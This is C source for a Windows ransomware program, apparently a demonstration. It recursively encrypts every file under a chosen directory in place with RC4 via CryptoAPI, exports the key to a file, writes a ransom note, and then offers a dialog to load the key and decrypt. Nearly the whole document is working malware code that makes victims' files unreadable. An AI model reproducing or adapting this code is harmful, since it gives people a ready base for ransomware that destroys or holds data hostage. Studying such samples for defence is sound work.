#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <windows.h>
#include <wincrypt.h>
#include <Commdlg.h>
#define RED "\033[31m"
#define RESET "\033[0m"

#define KEYLENGTH 0x00800000
#define ENCRYPT_ALGORITHM CALG_RC4
#define BLOCK_SIZE 8
#define ID_EDIT 1

void IterateAllFiles(WCHAR *dir, HCRYPTKEY hKey, int arg)
{
    WIN32_FIND_DATAW fileData;
    HANDLE file;
    WCHAR path[MAX_PATH];

    // iterating files in the path
    swprintf(path, MAX_PATH, L"%s\\*", dir);
    file = FindFirstFileW(path, &fileData);

    if (file == INVALID_HANDLE_VALUE)
    {
        printf("FindFirstFileW has failed: 0x%x\n", GetLastError());
        return;
    }

    do
    {
        if ((fileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0 && wcscmp(fileData.cFileName, L".") != 0 && wcscmp(fileData.cFileName, L"..") != 0)
        {
            swprintf(path, MAX_PATH, L"%s\\%s", dir, fileData.cFileName);
            IterateAllFiles(path, hKey, arg);
        }
        else if ((fileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == 0)
        {
            swprintf(path, MAX_PATH, L"%s\\%s", dir, fileData.cFileName);
            Encrypt(path, hKey, arg);
        }
    } while (FindNextFileW(file, &fileData));

    FindClose(file);
}

void Encrypt(LPCWSTR filePath, HCRYPTKEY hKey, int arg)
{

    HANDLE PlainTextFile = INVALID_HANDLE_VALUE;
    HANDLE EncryptedFile;
    BYTE Buffer[100000];
    DWORD dwBlockSize = 0;
    DWORD Bytes_Written = 0;
    DWORD Bytes_Read = 0;
    DWORD dwCount = 0;
    BOOL bResult = FALSE;

    PlainTextFile = CreateFileW(
        filePath,
        GENERIC_ALL,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL);
    if (PlainTextFile == INVALID_HANDLE_VALUE)
    {
        printf("ERROR FINDING OR OPENING THE FILE :0x%x\n", GetLastError());
    }
    if (!ReadFile(
            PlainTextFile,
            Buffer,
            sizeof(Buffer),
            &Bytes_Read,
            NULL))
    {
        printf("ERROR WHILE READING FILE : 0x%x\n", GetLastError());
    }

    switch (arg)
    {
    case 0:
        bResult = CryptEncrypt(
            hKey,
            NULL,
            TRUE,
            0,
            Buffer,
            &Bytes_Read,
            Bytes_Read);
        if (!bResult)
        {
            printf(" ERROR WHILE ENCRYPTING DATA : 0x%x\n", GetLastError());
        }

        if (SetFilePointer(PlainTextFile, 0, NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER || !SetEndOfFile(PlainTextFile) || !WriteFile(PlainTextFile, Buffer, Bytes_Read, &Bytes_Written, NULL))
        {
            printf(" ERROR WHILE WRITING ENCRYPTED DATA TO FILE : 0x%x\n", GetLastError());
        }
        CloseHandle(PlainTextFile);
        break;
    case 1:
        // Function for Decription decrypting files

        /*if (PlainTextFile == INVALID_HANDLE_VALUE)
        {
            printf("ERROR FINDING OR OPENING THE FILE :0x%x\n", GetLastError());
        }*/
        bResult = CryptDecrypt(
            hKey,
            NULL,
            TRUE,
            0,
            Buffer,
            &Bytes_Read);

        if (!bResult)
        {
            printf(" ERROR WHILE De-ENCRYPTING DATA :0x%x\n", GetLastError());
        }

        if (SetFilePointer(PlainTextFile, 0, NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER || !SetEndOfFile(PlainTextFile) || !WriteFile(PlainTextFile, Buffer, Bytes_Read, &Bytes_Written, NULL))
        {
            printf(" ERROR WHILE WRITING De-ENCRYPTED DATA TO FILE : 0x%x\n", GetLastError());
        }
        break;
    default:
        break;
    }
}

int main(int argc, char *argv[])
{
    WCHAR path[MAX_PATH];
    HCRYPTKEY hKey;
    HCRYPTPROV hCryptProv;
    int arg;

    swprintf(path, MAX_PATH, L"C:\\Path_To_Directory_You_Wish_To_Encrypt");

    // creating encryption context for the entire code
    if (!CryptAcquireContext(
            &hCryptProv,
            NULL,
            MS_ENHANCED_PROV,
            PROV_RSA_FULL,
            0))
    {
        printf(" ERROR ACQUIRING THE ENCRYPTION CONTEXT : 0x%x\n", GetLastError());
    }

    // generating a key
    if (!CryptGenKey(
            hCryptProv,
            ENCRYPT_ALGORITHM,
            KEYLENGTH | CRYPT_EXPORTABLE,
            &hKey))
    {
        printf(" ERROR WHILE GENERATING KEY :0x%x\n", GetLastError());
        CryptDestroyKey(hKey);
    }

    exportKey(hKey);
    arg = 0;
    IterateAllFiles(path, hKey, arg);
    Ransomnote();
    OpenKeyFile(hCryptProv, hKey, path);
    return 0;
}

void exportKey(HCRYPTKEY hKey)

{
    HCRYPTPROV hProv = NULL;
    HCRYPTKEY hExportKey = NULL;
    DWORD dwBlobLen;

    // Get the provider handle
    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, 0))
    {
        printf("ERROR WHILE ACQUIRING CONTEXT: 0x%x\n", GetLastError());
        return;
    }

    // Get the size of the exported key blob
    if (!CryptExportKey(hKey, NULL, PLAINTEXTKEYBLOB, 0, NULL, &dwBlobLen))
    {
        printf("ERROR WHILE GETTING KEY BLOB SIZE: 0x%x\n", GetLastError());
        return;
    }

    // Allocate memory for the exported key blob
    BYTE *pbKeyBlob = (BYTE *)malloc(dwBlobLen);
    if (!pbKeyBlob)
    {
        printf("ERROR WHILE ALLOCATING MEMORY\n");
        return;
    }

    // Export the key
    if (!CryptExportKey(hKey, NULL, PLAINTEXTKEYBLOB, 0, pbKeyBlob, &dwBlobLen))
    {
        printf("ERROR WHILE EXPORTING KEY: 0x%x\n", GetLastError());
        free(pbKeyBlob);
        return;
    }

    // Create a new key handle from the exported key blob
    if (!CryptImportKey(hProv, pbKeyBlob, dwBlobLen, NULL, 0, &hExportKey))
    {
        printf("ERROR WHILE IMPORTING KEY: 0x%x\n", GetLastError());
        free(pbKeyBlob);
        return;
    }

    // Save the exported key to a file
    HANDLE hFile = CreateFile("C:\\Users\\key.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        printf("ERROR WHILE CREATING FILE: 0x%x\n", GetLastError());
        free(pbKeyBlob);
        return;
    }

    DWORD dwBytesWritten;
    if (!WriteFile(hFile, pbKeyBlob, dwBlobLen, &dwBytesWritten, NULL))
    {
        printf("ERROR WHILE WRITING TO FILE: 0x%x\n", GetLastError());
        free(pbKeyBlob);
        CloseHandle(hFile);
        return;
    }

    // printf("Key exported to key.txt\n");

    free(pbKeyBlob);
    CloseHandle(hFile);
}
void ImportKey(HCRYPTPROV hCryptProv, HCRYPTKEY *phKey, LPCWSTR filename)

{
    HANDLE hFile = CreateFile(filename, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        printf("ERROR WHILE OPENING FILE: 0x%x\n", GetLastError());
        return;
    }

    DWORD dwFileSize = GetFileSize(hFile, NULL);
    if (dwFileSize == INVALID_FILE_SIZE)
    {
        printf("ERROR WHILE GETTING FILE SIZE: 0x%x\n", GetLastError());
        CloseHandle(hFile);
        return;
    }

    BYTE *pbFileData = (BYTE *)malloc(dwFileSize);
    if (!pbFileData)
    {
        printf("ERROR WHILE ALLOCATING MEMORY\n");
        CloseHandle(hFile);
        return;
    }

    DWORD dwBytesRead;
    if (!ReadFile(hFile, pbFileData, dwFileSize, &dwBytesRead, NULL) || dwBytesRead != dwFileSize)
    {
        printf("ERROR WHILE READING FILE: 0x%x\n", GetLastError());
        free(pbFileData);
        CloseHandle(hFile);
        return;
    }

    if (!CryptImportKey(hCryptProv, pbFileData, dwFileSize, NULL, 0, phKey))
    {
        printf("ERROR WHILE IMPORTING KEY: 0x%x\n", GetLastError());
        free(pbFileData);
        CloseHandle(hFile);
        return;
    }

    // printf("Key imported from %s \n", filename);

    free(pbFileData);
    CloseHandle(hFile);
}
void Ransomnote()
{

    MessageBox(NULL, " !!!!!!!!!!!!!!! CHECK THE Ransomware_Note.txt !!!!!!!!!!!! ", "Ransomware Note", MB_ICONWARNING);
    HANDLE RansomNote = INVALID_HANDLE_VALUE;
    // sleep(5);

    char Text[] = " !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! Ransomware Note !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! \n\n All your files have been encrypted , Choose the key.txt file to decrypt all your files ";
    LPCWSTR filename = L"C:\\Users\\RansomWare_Note.txt";
    DWORD bw = 0;
    RansomNote = CreateFileW(
        filename,
        GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL);
    if (RansomNote == INVALID_HANDLE_VALUE)
    {
        printf("ERROR CREATING RANSOMNOTE FILE :0x%x\n", GetLastError());
    }

    if (!WriteFile(RansomNote, Text, sizeof(Text), &bw, NULL))
    {
        printf(" ERROR WRITING THE RANSOMNOTE :0x%x\n", GetLastError());
    }
}

int OpenKeyFile(HCRYPTPROV hCryptProv, HCRYPTKEY *hKey, WCHAR *path)
{
    int arg = 1;
    OPENFILENAME ofn;
    char szFile[MAX_PATH] = "";

    ZeroMemory(&ofn, sizeof(ofn));
    ofn.lStructSize = sizeof(ofn);
    ofn.hwndOwner = NULL;
    ofn.lpstrFilter = "Text Files (*.txt)\0*.txt\0All Files (*.*)\0*.*\0";
    ofn.lpstrFile = szFile;
    ofn.nMaxFile = MAX_PATH;
    ofn.Flags = OFN_EXPLORER | OFN_FILEMUSTEXIST | OFN_HIDEREADONLY;
    ofn.lpstrDefExt = "txt";

    if (GetOpenFileName(&ofn))
    {
        // printf("Selected file: %s\n", szFile);
        ImportKey(hCryptProv, hKey, szFile);
        IterateAllFiles(path, hKey, arg);
        MessageBox(NULL, " !!!!!!!!!!!!!!! CONGRATS ALL YOUR FILES HAVE BEEN DECRYPTED !!!!!!!!!!!! ", "CONGRATS", MB_ICONWARNING);
    }
    else
    {
        printf("No file selected.\n");
    }

    return 0;
}
